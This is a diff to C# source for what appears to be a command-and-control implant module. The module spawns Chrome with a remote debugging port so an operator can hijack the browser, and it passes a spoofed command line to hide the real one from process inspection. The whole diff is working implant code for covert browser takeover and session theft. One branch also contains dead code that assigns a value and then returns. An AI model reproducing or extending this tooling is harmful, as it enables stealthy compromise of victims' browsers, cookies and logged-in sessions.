@@ -27,7 +27,6 @@ namespace Agent
         }
         public async Task Execute(ServerJob job)
         {
-
             CursedArgs args = JsonSerializer.Deserialize<CursedArgs>(job.task.parameters);
 
             if(args.port > 0)
@@ -49,8 +48,6 @@ namespace Agent
             {
                 this.config.target = args.target;
             }
-            
- 
         }
         private async Task CChrome(string payload, string task_id)
         {
@@ -321,7 +318,7 @@ namespace Agent
                         return;
                     }
 
-                    if (!await SpawnElectron(inputParts[1], message.task_id))
+                    if (!await SpawnElectron(inputParts[1], user_input, message.task_id))
                     {
                         ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
                         return;
@@ -345,37 +342,39 @@ namespace Agent
                         message_type = InteractiveMessageType.Output,
                     });
                     break;
-
             }
         }
-        private async Task<bool> SpawnElectron(string choice, string task_id)
+        private async Task<bool> SpawnElectron(string choice, string full_cmdline, string task_id)
         {
-            string executable_path = string.Empty;
+            string commandline = string.Empty;
+
             switch (choice.ToLower())
             {
                 case "chrome":
-                    executable_path = ChromeFinder.FindChromePath();
+                    commandline = $"{ChromeFinder.FindChromePath()} --remote-debugging-port={this.config.debug_port}";
                     break;
                 case "edge":
                     break;
                 default:
+                    commandline = full_cmdline;
                     return false;
             }
 
             string spoofedcmdline = string.Empty;
             if (!string.IsNullOrEmpty(this.config.cmdline))
             {
-                spoofedcmdline = $"{executable_path} {this.config.cmdline}";
+                spoofedcmdline = $"{ChromeFinder.FindChromePath()} {this.config.cmdline}";
             }
 
             SpawnOptions opts = new SpawnOptions()
             {
                 task_id = task_id,
-                commandline = $"{executable_path} --remote-debuggin-port={this.config.debug_port}",
+                commandline = commandline,
                 spoofedcommandline = spoofedcmdline,
                 output = false,
                 parent = this.config.parent
             };
+
             return await spawner.Spawn(opts);
         }
         private async Task<bool> Cursed(string choice, string task_id)
